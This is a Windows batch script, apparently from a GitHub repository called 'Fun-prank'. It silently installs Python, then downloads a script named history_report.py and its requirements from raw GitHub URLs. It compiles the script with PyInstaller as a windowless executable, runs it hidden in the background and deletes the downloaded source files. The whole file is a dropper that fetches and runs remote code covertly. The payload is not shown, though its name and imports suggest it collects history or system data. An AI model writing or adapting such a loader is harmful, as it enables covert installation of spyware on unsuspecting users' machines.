@echo off
:: Step 1: Define the installation folder (AppData\Local)
set INSTALL_DIR=%LOCALAPPDATA%\History

:: Step 2: Create the "History" folder if it doesn't exist
if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%"
)

:: Step 3: Check if Python is installed
where python >nul 2>nul
if %errorlevel% neq 0 (
    echo Python is not installed. Installing Python silently...
    powershell -Command "Start-Process 'https://www.python.org/ftp/python/3.9.9/python-3.9.9-amd64.exe' -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -NoNewWindow -Wait"
)

:: Step 4: Install pip if not installed
where pip >nul 2>nul
if %errorlevel% neq 0 (
    echo pip is not installed. Installing pip silently...
    python -m ensurepip --upgrade
)

:: Step 5: Download the requirements.txt from GitHub into the install directory
echo Downloading requirements.txt...
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/requirements.txt -OutFile %INSTALL_DIR%\requirements.txt"

:: Step 6: Install necessary Python libraries from requirements.txt
echo Installing necessary libraries from requirements.txt...
python -m pip install -r "%INSTALL_DIR%\requirements.txt"

:: Step 7: Check if requests library is installed
python -c "import requests" >nul 2>nul
if %errorlevel% neq 0 (
    echo Requests installation failed. Exiting...
    pause
    exit /b
)

:: Step 8: Download the Python script from GitHub into the install directory
echo Downloading Python script...
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/history_report.py -OutFile %INSTALL_DIR%\history_report.py"

:: Step 9: Download the .bat file for running silently into the install directory
echo Downloading .bat file for running silently...
powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Rma2212/Fun-prank/refs/heads/main/install_run_silent.bat -OutFile %INSTALL_DIR%\install_run_silent.bat"

:: Step 10: Check if the Python script exists
if not exist "%INSTALL_DIR%\history_report.py" (
    echo Script file not found. Please make sure history_report.py is in the "History" folder.
    pause
    exit /b
)

:: Step 11: Convert the Python script to an executable using PyInstaller with explicit imports
echo Converting script to executable...
pyinstaller --onefile --noconsole --hidden-import=requests --hidden-import=psutil --hidden-import=gpuinfo "%INSTALL_DIR%\history_report.py"

:: Step 12: Check if the executable was created
if not exist "dist\history_report.exe" (
    echo Failed to create executable. Exiting...
    pause
    exit /b
)

:: Step 13: Move the executable to the install directory
echo Moving executable to install directory...
move /Y dist\history_report.exe "%INSTALL_DIR%\history_report.exe"

:: Step 14: Run the executable silently
echo Running the executable silently...
start /B "%INSTALL_DIR%\history_report.exe"

:: Step 15: Clean up PyInstaller files (optional)
echo Cleaning up PyInstaller files...
rd /s /q "build"
del /q "history_report.spec"

:: Step 16: Clean up the downloaded files from the install directory
del "%INSTALL_DIR%\install_run_silent.bat"
del "%INSTALL_DIR%\history_report.py"
del "%INSTALL_DIR%\requirements.txt"

pause
